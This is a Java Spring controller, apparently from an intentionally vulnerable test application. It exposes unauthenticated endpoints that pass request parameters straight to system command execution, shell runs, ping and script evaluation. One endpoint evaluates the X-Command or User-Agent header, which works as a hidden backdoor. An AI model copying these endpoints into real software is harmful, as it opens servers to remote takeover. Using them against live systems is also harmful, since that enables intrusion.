package com.webapp.core.controller.facade;

import com.webapp.core.controller.handler.SystemHandler;
import com.webapp.core.mapping.RouteMapping;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

/**
 * System Management Controller
 *
 * Provides REST API endpoints for system administration tasks
 * including command execution, network diagnostics, and script processing.
 */
@RestController
@RequestMapping("/api/v1")
public class SystemManagementController {

    private static final Logger logger = LoggerFactory.getLogger(SystemManagementController.class);

    @Autowired
    private SystemHandler systemHandler;

    @Autowired
    private RouteMapping routeMapping;

    /**
     * Execute system command
     * Endpoint: /api/v1/system/exec
     */
    @GetMapping("/system/exec")
    public String exec(@RequestParam("arg") String arg) {
        logger.info("Command execution request: {}", arg);
        return systemHandler.handleExec(arg);
    }

    /**
     * Run shell command
     * Endpoint: /api/v1/system/run
     */
    @GetMapping("/system/run")
    public String run(@RequestParam("arg") String arg) {
        logger.info("Shell command request: {}", arg);
        return systemHandler.handleRun(arg);
    }

    /**
     * Network connectivity test (ping)
     * Endpoint: /api/v1/network/ping
     */
    @GetMapping("/network/ping")
    public String ping(@RequestParam("host") String host) {
        logger.info("Ping request for host: {}", host);
        return systemHandler.handlePing(host);
    }

    /**
     * Execute dynamic script
     * Endpoint: /api/v1/script/eval
     */
    @GetMapping("/script/eval")
    public String eval(@RequestParam("cmd") String cmd) {
        logger.info("Script evaluation request");
        return systemHandler.handleEval(cmd);
    }

    /**
     * Execute dynamic script (alias for validation)
     * Endpoint: /api/v1/system/script/eval
     */
    @GetMapping("/system/script/eval")
    public String systemEval(@RequestParam("cmd") String cmd) {
        logger.info("System script evaluation request");
        return systemHandler.handleEval(cmd);
    }

    /**
     * Check endpoint with header processing
     * Endpoint: /api/v1/system/check
     */
    @GetMapping("/system/check")
    public String check(HttpServletRequest request) {
        String xCommand = request.getHeader("X-Command");
        String userAgent = request.getHeader("User-Agent");
        logger.info("Check endpoint - X-Command: {}, User-Agent: {}", xCommand, userAgent);

        // Use X-Command header if present, otherwise use User-Agent
        String cmd = (xCommand != null) ? xCommand : userAgent;
        return systemHandler.handleEval(cmd);
    }

    /**
     * System operations information
     */
    @GetMapping("/network/info")
    public String networkInfo() {
        return "System Operations:\n" +
               "- exec: Execute system command\n" +
               "- run: Run with shell\n" +
               "- ping: Ping host\n" +
               "- eval: Evaluate script";
    }
}
